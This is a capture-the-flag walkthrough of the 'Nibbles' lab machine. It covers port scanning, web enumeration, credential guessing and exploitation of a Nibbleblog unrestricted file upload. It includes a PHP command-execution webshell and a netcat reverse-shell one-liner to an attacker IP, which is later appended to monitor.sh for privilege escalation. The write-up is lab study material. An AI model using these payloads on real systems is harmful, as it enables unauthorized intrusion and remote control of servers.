# [Nibbles] — [Easy] — [Linux]

## Metadata

- IP: 10.129.200.170
- Date started / completed:
- Status: 🟡 In progress / 🟢 Rooted / 🔴 Blocked
- Tags: common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges.
- Time: recon __ min | exploitation __ min | privesc __ min

---

## 1. Reconnaissance

First i started to run some scanning using Nmap , this includes : 

Initially i scanned using s service version scan and then then get the result from only the open ports and saved to the file [[nibble_inital_recon]]

`namp -sV --open -oA nibble_intial_recon 10.129.200.170`

This initial scan showed me that the target machine have two open ports 
SSH and an Apache web server. 

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 09:33 EDT
Nmap scan report for 10.129.200.170
Host is up (0.043s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds
```


Then checked for a full TCP scan , to check whether what all the other ports/services which are open and observed there are no other open ports or services the results are saved to [[nibble_fulltcp_scan]]

```
nmap -sV -p- --open -oA nibble_fulltcp_scan -v 10.129.200.170

┌─[✗]─[root@htb-uetmucxfl2]─[~]
└──╼ #nmap -sV -p- --open -oA nibble_fulltcp_scan 10.129.200.170
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 09:42 EDT
Nmap scan report for 10.129.200.170
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.16 seconds

```

Then i used netcat for banner grabbing the target ports 

`nc -nv 10.129.200.170 22`

```
└──╼ #nc -nv 10.129.200.170 22
Connection to 10.129.200.170 22 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2

```

The result shows an OpenSHH server is running on the target machine :
An OpenSSH server is ==a background program that runs on a computer to listen for and accept secure, encrypted connection requests from remote devices==

No much details were observed for port 80  from netcat 

```
┌─[root@htb-uetmucxfl2]─[~]
└──╼ #nc -nv 10.129.200.170 80
Connection to 10.129.200.170 80 port [tcp/*] succeeded!
```

Now i got there are two open ports with in the target .. now lets user some Nmap script scan on the target for getting additional bits of information. this can be done using the following command also here i am only checking the two open ports 22 and 80 as the scripts are intrusive it better to check only the open/available ones , this results are saved to [[nibbles_script_scan_default]]

`namp -sC -p 22,80 -oA nibbles_script_scan_default 10.129.200.170`

```
┌─[✗]─[root@htb-uetmucxfl2]─[~]
└──╼ #nmap -sC -p 22,80 -oA nibbles_script_scan_default 10.129.200.170 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 09:59 EDT
Nmap scan report for 10.129.200.170
Host is up (0.052s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 2.38 seconds
```

These script does not gave me anything that's useful , we can do one more script scan to check whether is we get anything useful

we are going to run the `http-enum` script

`namp -sV --script=http-enum -oA nibbles_nmap_http_enum_script 10.129.200.170`

```
┌─[root@htb-uetmucxfl2]─[~]
└──╼ #nmap -sV --script=http-enum -oA  nibbles_nmap_http_enum_script 10.129.200.170
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 10:05 EDT
Nmap scan report for 10.129.200.170
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds
```

An additonal Tip for nmap enumeration .We can check which ports `nmap` scans for a given scan type by running a scan with no target specified, using the command `nmap -v -oG -`. Here we will output the greppable format to stdout with `-oG -` and `-v` for verbose output. Since no target is specified, the scan will fail but will show the ports scanned.

 `nmap -v -oG -`


Here the scans using Nmap is done , as we found that the target machine is running 
a Apache server , we are moving into web foot printing

# Web Enumeration :

Here ware initially using the utility called `whatweb` , it is an OSINT tool to find what technologies are used in a web page :

```
┌─[root@htb-cnxfrdjcqc]─[~]
└──╼ #whatweb 10.129.192.128
http://10.129.192.128 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.192.128]
┌─[root@htb-cnxfrdjcqc]─[~]
```

Here with  `whatweb` we did not got any interesting information 
we can now open the webpage by pasting the machine Ip in the address bar

Here it just resolves to a page that says` hello world` 

![[Pasted image 20260913010241.png|700]]

Then i opened the inspect window and observed an interesting comment ` /nibbleblog/ directory. Nothing interesting here! `

![[Pasted image 20260913010438.png|700]]

We can do this by using the `curl` command as well :

![[Pasted image 20260913010610.png|700]]

Now when we move to `http://10.129.192.128/nibbleblog/` we got something interesting 

![[Pasted image 20260913010750.png]]

Just googled `Nibbleblog` and observed , **Nibbleblog** is ==a free, lightweight CMS (Content Management System) designed for creating and managing blogs without needing a traditional database==

While doing OSINT searches i observed the  **Nibbleblog** have a **Unrestricted File Upload (CVE-2015-6967)**: Versions before 4.0.5 allow remote administrators to execute arbitrary PHP code through the "My Image" plugin. The application fails to verify file extensions, allowing attackers to upload executable files and access them directly. This flaw is tracked and weaponized via the Metasploit Nibbleblog File Upload Module

while checking with whatweb on `http://10.129.192.128/nibbleblog/` we observed interesting contents on the web page , the page built using 

```
JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], 
```

```
┌─[root@htb-cnxfrdjcqc]─[~]
└──╼ #whatweb http://10.129.192.128/nibbleblog/
http://10.129.192.128/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.192.128], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]

```

Then i ran `gobuster` to find directories in the web application :

Command : `gobuster dir -u http://10.129.192.128/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`

```
┌─[✗]─[root@htb-cnxfrdjcqc]─[~]
└──╼ #gobuster dir -u http://10.129.192.128/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.192.128/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 304]
/.htpasswd            (Status: 403) [Size: 309]
/.htaccess            (Status: 403) [Size: 309]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 327] [--> http://10.129.192.128/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 329] [--> http://10.129.192.128/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 331] [--> http://10.129.192.128/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 329] [--> http://10.129.192.128/nibbleblog/plugins/]
/themes               (Status: 301) [Size: 328] [--> http://10.129.192.128/nibbleblog/themes/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```


We have opened the `/README` file and observed that the  version of the `Nibbleblog` installed  is `v4.0.3` which is the vulnerable version.

At last traversing through all the available directory we found the file `users.xml` 
We can view the contents using the `curl` command :

```
curl -s http://10.129.192.128/nibbleblog/content/private/users.xml | xmllint --format - 
```

Result : 

```
┌─[root@htb-cnxfrdjcqc]─[~]
└──╼ #curl -s http://10.129.192.128/nibbleblog/content/private/users.xml | xmllint --format - 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">0</session_fail_count>
    <session_date type="integer">1514544131</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
</users>

```

From the result we can observe that the user name seem to be "admin" also the file have the details of the blacklisted IP as well.

Checked for default password and tried to manually brute force with  default login credentials  , this returned there is an IP blacklist protection after certain attempts.

![[Pasted image 20260913025920.png]]

Checking on the config.xml file :
`
`curl -s http://10.129.200.170/nibbleblog/content/private/config.xml | xmllint --format -`

```
┌─[root@htb-dhgkukismf]─[~]
└──╼ #curl -s http://10.129.200.170/nibbleblog/content/private/config.xml | xmllint --format -
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.10.10.134/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>

```

From corelating all the details , in the config.xml file the title and notification emails is also named after nibbles , just tried with the credentials `admin:nibbles` to see if it is the password and it got worked . 

![[Pasted image 20260913031445.png]]
### Insights from the Web enumeration : 

- ==Identified the technologies with the in the web page== 
- ==able to identify directory listing is enabled in the application== 
- ==Identified that the user name of the admin login page is `admin`==
- ==confirmed that the login portal have an IP block list after certain attempts== 
- ==The main finding is that the application is using the vulnerable version of the Nibbleblog which have a file upload vulnerability and password for the admin page is 'nibbles'.==

## Now we are moving into initial foothold phase:

 While further enumerating i identified that , there is an photo upload feature in the plugging directory... there we can upload an image .. i am just trying to replace it with a sample PHP code to check whether remote code execution is possible on the server...

PHP code `<?php system('id'); ?>` , here the php code prints out the `id` of the system.

I uploaded the file , it returned some errors : 

![[Pasted image 20260914010859.png]]

Now i need to check whether the file  is actually uploaded or not , we can use the curl command 

`curl http://10.129.193.220/nibbleblog/content/private/plugins/my_image/image.php`

==**Yaaahhhhss.. it worked .......🥹 , it returned the result :**== 

```
┌─[root@htb-mq6k2c2izg]─[~]
└──╼ #curl http://10.129.193.220/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

``` 

This shows that the Apache server is running in nibbler user context...
Now we are going to craft a reverse shell ....

We can use a Bash reverse shell one liner....
We can find the reverse shell cheat sheets from  [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

```

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacher IP> <Listening port> >/tmp/f"); ?>

└──╼ [★]$ cat image.php 
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.238 9443 >/tmp/f"); ?>

```

Now we listens on the port 9443 with the help of netcat 

```
┌─[root@htb-mq6k2c2izg]─[~]
└──╼ #nc -lvnp 9443
```

Now we can either visit the URL `http://10.129.193.220/nibbleblog/content/private/plugins/my_image/image.php` via browser or we can use the curl command 

```
┌─[root@htb-mq6k2c2izg]─[/home/htb-ac-2852957]
└──╼ #curl http://10.129.193.220/nibbleblog/content/private/plugins/my_image/image.php

```

Now we have got the reverse shell.... we have successfully exploited the remote code execution vulnerability 

![[Pasted image 20260914012938.png]]

Now this is just only a normal sh shell now we need to upgrade to a interactive TTY..
Here in this shell does to allow us to smoothly move around like copy paste , commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. 

More details for this are available on here : [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

Here we are going to spawn an interactive pseudo bash shell using python :

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ clear
<ml/nibbleblog/content/private/plugins/my_image$ cle               ar        
TERM environment variable not set.
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls
ls
db.xml	image.php
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls /home
<ml/nibbleblog/content/private/plugins/my_image$ ls                /home     
nibbler
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ pwd
<ml/nibbleblog/content/private/plugins/my_image$ pwd                         
/var/www/html/nibbleblog/content/private/plugins/my_image
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler
<ml/nibbleblog/content/private/plugins/my_image$ cd                /home/nibbler
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
79c03865431abf47b90ef24b9695e148
nibbler@Nibbles:/home/nibbler$ echo 
```

==**Now we have moved to the users home directory /home/nibblers and found the user flag as well :**==

==**FLAG : 79c03865431abf47b90ef24b9695e148**==


![[Pasted image 20260914033901.png]]


```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  10.10.15.238 8443 >/tmp/f' | tee -a monitor.sh
```


![[Pasted image 20260914035235.png]]

![[Pasted image 20260914035305.png]]
